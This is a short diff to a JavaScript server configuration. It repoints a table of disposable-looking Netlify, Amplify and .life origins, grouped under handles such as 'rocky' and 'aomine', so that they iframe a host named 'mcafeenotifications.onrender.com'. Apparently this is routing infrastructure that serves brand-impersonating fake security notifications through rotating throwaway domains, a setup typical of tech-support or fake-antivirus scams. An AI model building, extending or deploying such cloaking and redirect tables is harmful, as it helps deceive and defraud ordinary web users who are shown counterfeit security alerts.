@@ -59,20 +59,20 @@ redis.on("error", (err) => console.error("Redis error:", err.message));
 //                 redirect to it (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://nimble-bonbon-e8f851.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
-    "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app" },
+    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://cozy-kheer-cea1f9.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://nimble-bonbon-e8f851.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://spontaneous-salamander-ec6bf0.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://benevolent-lebkuchen-4f36c6.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://earnest-sawine-a7ac5c.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
+    "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
     "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://benevolent-medovik-1917c8.netlify.app" },
   },
   aomine: {
-    "https://zen-hawellness.life": { method: "iframe", target: "https://resonant-dasik-ac9ca2.netlify.app/aomine.html" },
+    "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
   },
 };
 
